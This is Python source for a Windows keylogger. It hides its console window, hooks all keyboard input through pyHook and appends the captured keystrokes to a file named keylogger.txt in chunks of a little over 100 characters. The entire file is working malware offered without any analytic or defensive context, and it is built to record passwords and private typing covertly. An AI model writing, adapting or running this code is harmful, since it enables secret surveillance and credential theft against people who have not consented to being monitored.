import win32api
import win32console
import win32gui
import pythoncom,pyHook

 
win=win32console.GetConsoleWindow()
win32gui.ShowWindow(win,0)

data=''
def OnKeyboardEvent(event):
    global data
    if event.Ascii==13:
        keys='<ENTER>'
    elif event.Ascii==8:
        keys='<BACK SPACE>'
    elif event.Ascii==9:
        keys='<TAB>'
    else:
        keys=chr(event.Ascii)
    data=data+keys
    datasaver()
    
def datasaver():
    global data
    if len(data)>100:
        fp=open("keylogger.txt","a")
        fp.write(data)
        fp.close()
        data=''
    return True
                        
hm=pyHook.HookManager()
hm.KeyDown=OnKeyboardEvent
                           
hm.HookKeyboard()
                                
pythoncom.PumpMessages()
